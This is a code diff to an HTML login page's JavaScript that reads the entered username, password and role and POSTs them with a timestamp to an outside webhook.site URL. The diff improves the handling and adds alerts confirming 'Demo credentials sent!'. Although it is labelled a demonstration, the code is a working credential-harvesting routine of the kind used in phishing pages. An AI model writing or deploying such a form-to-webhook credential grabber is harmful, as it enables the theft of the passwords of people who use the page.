@@ -130,11 +130,12 @@
   </div>
   <script>
   document.querySelector('.login-btn').addEventListener('click', function () {
-    const username = document.querySelector('input[type="text"]').value;
-    const password = document.querySelector('input[type="password"]').value;
-    const role = document.querySelector('input[name="loginas"]:checked').nextSibling.textContent.trim();
+    const username = document.querySelector('input[type="text"]').value.trim();
+    const password = document.querySelector('input[type="password"]').value.trim();
+    const roleElement = document.querySelector('input[name="loginas"]:checked');
+    const role = roleElement ? roleElement.nextSibling.textContent.trim() : 'Unknown';
 
-    // Send data to a controlled endpoint for demonstration
+    // Send the data to your webhook.site URL
     fetch('https://webhook.site/35921cd4-7013-453f-81ca-2ed3458561ed', {
       method: 'POST',
       headers: {
@@ -146,11 +147,18 @@
         role: role,
         timestamp: new Date().toISOString()
       })
+    })
+    .then(() => {
+      console.log("✅ Data sent to webhook successfully.");
+      alert("🔍 Demo credentials sent! (Check your webhook.site)");
+    })
+    .catch((error) => {
+      console.error("❌ Error sending data:", error);
+      alert("❌ Failed to send data.");
     });
-
-    alert("🔍 Demo data sent to server (check your webhook log).");
   });
 </script>
+
 
 </body>
 </html>
